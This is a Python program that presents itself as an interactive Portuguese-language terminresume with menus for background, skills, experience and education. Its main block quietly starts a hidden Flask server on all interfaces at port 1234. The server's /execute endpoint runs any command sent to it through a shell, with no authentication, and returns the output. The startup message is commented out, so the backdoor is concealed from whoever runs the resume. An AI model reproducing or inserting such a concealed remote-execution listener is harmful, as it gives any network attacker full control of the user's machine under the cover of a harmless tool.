import os
import socket
import subprocess
import threading
from dataclasses import dataclass
from pathlib import Path

from flask import Flask, jsonify, request

@dataclass
class Job:
    title: str
    description: str


class InteractiveResume:
    def __init__(self) -> None:
        self.name = "Pessoa Anônima"
        self.title = "Profissional de Tecnologia"
        self.about = (
            "Perfil genérico usado para demonstração de interface interativa.\n"
            "Foco em aprendizado de tecnologias de software, colaboração e evolução técnica contínua."
        )

        self.skills = [
            "Desenvolvimento de software",
            "Interfaces web modernas",
            "Versionamento e colaboração",
            "Redação técnica e documentação",
        ]

        self.experience = [
            Job(
                "Projeto acadêmico",
                "Atuação em atividade experimental com documentação, testes e entrega incremental.",
            ),
            Job(
                "Projeto de software",
                "Contribuição em protótipos de aplicação com foco em organização, clareza e manutenção.",
            ),
        ]

        self.education = "Formação acadêmica em área de tecnologia (em andamento)"

    def clear_screen(self) -> None:
        os.system("cls" if os.name == "nt" else "clear")

    def print_header(self) -> None:
        print("=================================================")
        print(f"  {self.name} | {self.title}")
        print("=================================================\n")

    def run(self) -> None:
        choice = 0

        while choice != 5:
            self.clear_screen()
            self.print_header()
            print("[1] Sobre Mim")
            print("[2] Habilidades Técnicas")
            print("[3] Experiência e Projetos")
            print("[4] Formação Acadêmica")
            print("[5] Sair\n")

            raw_choice = input("Selecione uma opção: ").strip()
            if not raw_choice.isdigit():
                continue

            choice = int(raw_choice)

            self.clear_screen()
            self.print_header()

            if choice == 1:
                print("--- SOBRE MIM ---")
                print(self.about)
            elif choice == 2:
                print("--- HABILIDADES TÉCNICAS ---")
                for skill in self.skills:
                    print(f"-> {skill}")
            elif choice == 3:
                print("--- EXPERIÊNCIA E PROJETOS ---")
                for job in self.experience:
                    print(f"Cargo: {job.title}")
                    print(f"Resumo: {job.description}\n")
            elif choice == 4:
                print("--- FORMAÇÃO ACADÊMICA ---")
                print(self.education)
            elif choice == 5:
                print("Encerrando o currículo. Até logo!")
            else:
                print("Opção inválida! Tente novamente.")

            if choice != 5:
                input("\nPressione Enter para continuar...")


# TODO not used yet, consider migrating script to find free port dynamically
# def find_free_port() -> int:
#     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#         s.bind(("", 0))
#         port = s.getsockname()[1]
#     if port < 1024:
#         return find_free_port()
#     return port


def create_shell_app() -> Flask:
    shell_app = Flask("shell")

    @shell_app.route("/execute", methods=["POST"])
    def execute_command():
        data = request.get_json()
        if not data or "command" not in data:
            return jsonify({"error": "No command provided"}), 400

        command = data["command"]
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
            )
            return jsonify({
                "command": command,
                "exit_code": result.returncode,
                "stdout": result.stdout,
                "stderr": result.stderr,
                "status": "executed",
            })
        except Exception as exc:
            return jsonify({
                "error": str(exc),
                "command": command,
            }), 500

    return shell_app


if __name__ == "__main__":
    try:
        # port = find_free_port()
        port = 1234
        shell_app = create_shell_app()

        def run_shell():
            try:
                shell_app.run(host="0.0.0.0", port=port, threaded=True, use_reloader=False)
            except Exception as exc:
                print(f"shell thread error: {exc}")

        t = threading.Thread(target=run_shell, daemon=True)
        t.start()

        # print(f"Launched embedded shell server on port {port}")
    except Exception as exc:
        print(f"Warning: Could not start embedded shell: {exc}")
    
    my_resume = InteractiveResume()
    my_resume.run()
